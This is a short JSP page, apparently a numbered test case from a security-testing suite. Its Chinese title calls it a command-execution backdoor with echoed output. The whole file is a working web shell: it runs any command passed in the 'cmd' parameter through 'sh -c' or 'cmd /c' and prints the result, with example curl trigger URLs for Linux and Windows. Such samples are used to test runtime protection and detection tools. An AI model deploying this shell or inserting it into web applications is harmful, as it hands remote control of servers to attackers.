<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head>  
    <meta charset="UTF-8"/>
    <title>004-2 命令执行，带回显</title>
</head>
<body>
    <h1>004 - 命令执行后门（有回显）</h1>
<%
String linux_querystring = "?cmd=ls+-la+/";
String windows_querystring = "?cmd=cmd+/c+dir";
String output = "";
String cmd    = request.getParameter ("cmd");
if (cmd != null)
{
    try {
        ProcessBuilder builder;
        if (File.separator.startsWith ("\\"))
            builder = new ProcessBuilder ("cmd", "/c", cmd);
        else
            builder = new ProcessBuilder ("sh", "-c", cmd);

        Process pro   = builder.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(pro.getInputStream()));

        String s = reader.readLine();
        while (s != null) {
            output = output + s + "\n";
            s = reader.readLine();
        }
        reader.close();
    } catch (Exception e) {
        out.print(e);
    }
} else {
    cmd = "whoami;ls;pwd";
}
%>
<div>
    <p>Linux 触发: </p>
    <p>curl '<a href="<%=request.getRequestURL()+linux_querystring%>" target="_blank"><%=request.getRequestURL()+linux_querystring%></a>'</p>
    <br>
    <p>Windows 触发: </p>
    <p>curl '<a href="<%=request.getRequestURL()+windows_querystring%>" target="_blank"><%=request.getRequestURL()+windows_querystring%></a>'</p>
<pre>
<%=output %>
</pre>
</div>
</body>
</html>
